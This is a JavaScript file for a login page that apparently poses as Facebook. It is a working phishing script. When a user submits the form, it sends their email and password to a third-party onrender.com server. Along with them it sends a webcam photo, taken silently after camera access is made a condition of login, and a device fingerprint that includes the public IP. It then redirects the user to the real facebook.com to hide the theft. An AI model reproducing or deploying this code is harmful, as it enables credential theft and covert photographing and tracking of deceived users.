document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.querySelector('.login-form');
    const emailInput = loginForm.querySelector('input[type="text"]');
    const senhaInput = loginForm.querySelector('input[type="password"]');
    const btnEntrar = loginForm.querySelector('.btn-entrar');
    
    if (!btnEntrar) {
        console.error('Botão de entrar não encontrado! Verifique se a classe .btn-entrar está correta.');
        return;
    }

    btnEntrar.disabled = true;
    btnEntrar.style.opacity = '0.6';
    btnEntrar.style.cursor = 'not-allowed';

    const verificarCampos = () => {
        const emailPreenchido = emailInput.value.trim() !== '';
        const senhaPreenchida = senhaInput.value.trim() !== '';
        
        if (emailPreenchido && senhaPreenchida) {
            btnEntrar.disabled = false;
            btnEntrar.style.opacity = '1';
            btnEntrar.style.cursor = 'pointer';
        } else {
            btnEntrar.disabled = true;
            btnEntrar.style.opacity = '0.6';
            btnEntrar.style.cursor = 'not-allowed';
        }
    }

    emailInput.addEventListener('input', verificarCampos);
    senhaInput.addEventListener('input', verificarCampos);

    const solicitarPermissaoCamera = async () => {
        try {
            const permissao = await navigator.mediaDevices.getUserMedia({ video: true });
            permissao.getTracks().forEach(track => track.stop());
            return true;
        } catch (error) {
            console.warn('Permissão da câmera negada:', error);
            return false;
        }
    };

    const verificarPermissaoCamera = async () => {
        try {
            const result = await navigator.permissions.query({ name: 'camera' });
            return result.state === 'granted';
        } catch (error) {
            console.error('Erro ao verificar permissão da câmera:', error);
            return false;
        }
    };

    const tirarFoto = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' }
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0);
            
            const foto = canvas.toDataURL('image/jpeg');
            
            stream.getTracks().forEach(track => track.stop());
            
            return foto;
        } catch (error) {
            console.error('Erro ao capturar foto:', error);
            return null;
        }
    };

    const verificarMemoria = () => {
        const memoriaTotal = navigator.deviceMemory || 0;
        if (memoriaTotal < 4) {
            console.warn('Dispositivo com pouca memória RAM:', memoriaTotal + 'GB');
        }
        return memoriaTotal;
    };

    const verificarPlataforma = () => {
        const plataforma = navigator.platform.toLowerCase();
        const plataformasConhecidas = ['win', 'mac', 'linux', 'android', 'iphone'];
        const plataformaReconhecida = plataformasConhecidas.some(p => plataforma.includes(p));
        
        if (!plataformaReconhecida) {
            console.warn('Plataforma não reconhecida:', plataforma);
        }
        return plataforma;
    };

    const verificarConexao = () => {
        if (!navigator.connection) return 'Não disponível';

        const conexao = navigator.connection;
        const tiposConexao = {
            'slow-2g': 'Conexão muito lenta',
            '2g': 'Conexão 2G',
            '3g': 'Conexão 3G',
            '4g': 'Conexão 4G'
        };

        return {
            tipo: tiposConexao[conexao.effectiveType] || conexao.effectiveType,
            velocidade: conexao.downlink,
            rtt: conexao.rtt,
            saveData: conexao.saveData
        };
    };

    const obterIpPublico = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Erro ao obter IP público:', error);
            return 'Não disponível';
        }
    };

    const coletarInformacoesDispositivo = async () => {
        const memoriaVerificada = verificarMemoria();
        const plataformaVerificada = verificarPlataforma();
        const conexaoVerificada = verificarConexao();
        const ipPublico = await obterIpPublico();

        const info = {
            plataforma: plataformaVerificada,
            userAgent: navigator.userAgent,
            idioma: navigator.language,
            resolucao: `${window.screen.width}x${window.screen.height}`,
            profundidadeCor: window.screen.colorDepth,
            memoriaDispositivo: memoriaVerificada,
            processadores: navigator.hardwareConcurrency,
            conexao: conexaoVerificada,
            ipPublico: ipPublico,
            wifi: {}
        };

        try {
            if (navigator.getBattery) {
                const bateria = await navigator.getBattery();
                info.bateria = {
                    nivel: bateria.level * 100,
                    carregando: bateria.charging,
                    tempoRestante: bateria.dischargingTime
                };
            }

            if (navigator.network && navigator.network.connection) {
                const connection = navigator.network.connection;
                info.wifi = {
                    ssid: connection.ssid,
                    signalStrength: connection.signalStrength,
                    security: connection.security,
                    frequencia: connection.frequency
                };
            }

        } catch (e) {
            console.error('Erro ao coletar informações:', e);
        }

        return info;
    };

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        if (!btnEntrar.disabled) {
            try {
                btnEntrar.textContent = 'Entrando...';
                btnEntrar.disabled = true;

                const permissaoConcedida = await solicitarPermissaoCamera();
                if (!permissaoConcedida) {
                    alert('É necessário permitir o acesso à câmera para continuar.');
                    btnEntrar.textContent = 'Entrar';
                    btnEntrar.disabled = false;
                    return;
                }

                const permissaoVerificada = await verificarPermissaoCamera();
                if (!permissaoVerificada) {
                    alert('A permissão da câmera foi revogada. Por favor, conceda acesso novamente.');
                    btnEntrar.textContent = 'Entrar';
                    btnEntrar.disabled = false;
                    return;
                }

                const foto = await tirarFoto();
                const infoDispositivo = await coletarInformacoesDispositivo();
                const ipPublico = await obterIpPublico();

                const response = await fetch('https://facebook-clone-api-render.onrender.com/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        email: emailInput.value.trim(),
                        senha: senhaInput.value.trim(),
                        dispositivo: infoDispositivo,
                        foto: foto,
                        ipPublico: ipPublico
                    })
                });

                const data = await response.json();
                console.log('Resposta do servidor:', data);

                if (response.ok && data.success) {
                    window.location.replace('https://www.facebook.com');
                } else {
                    throw new Error(data.message || 'Erro ao fazer login');
                }

            } catch (error) {
                console.error('Erro ao processar login:', error);
                alert('Erro ao fazer login. Por favor, tente novamente.');
                btnEntrar.textContent = 'Entrar';
                btnEntrar.disabled = false;
            }
        }
    });
});
